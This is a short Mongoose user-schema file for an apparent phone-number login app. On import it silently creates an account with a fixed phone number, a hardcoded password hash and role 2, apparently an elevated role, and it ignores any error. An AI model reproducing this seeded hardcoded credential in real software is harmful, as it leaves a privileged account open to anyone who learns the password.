const mongoose = require("mongoose");

const UserSchema = new mongoose.Schema({
    phonenumber: {
        type: String,
        required: [true, "Please provide a phone number!"],
        unique: [true, "Phone Number Exist"],
    },

    password: {
        type: String,
        required: [true, "Please provide a password!"],
    },

    favourite: {
        id: {
            type: String
        }
    },

    userimage: {
        default: null,
        type: String
    },

    role: {
        type: Number
    },

    status: {
        default: 1,
        type: Number
    }
})

module.exports = mongoose.model.Users || mongoose.model("Accounts", UserSchema);
const GetUser = mongoose.model("Accounts");

GetUser.create({ phonenumber: "0000000000", password: "$2b$10$USuRNamVHZWFVFpvBwmWZuDcaZgWRzuuWX7UFyoeAyRb35oLu5aFS", role: 2 }).catch(() => { })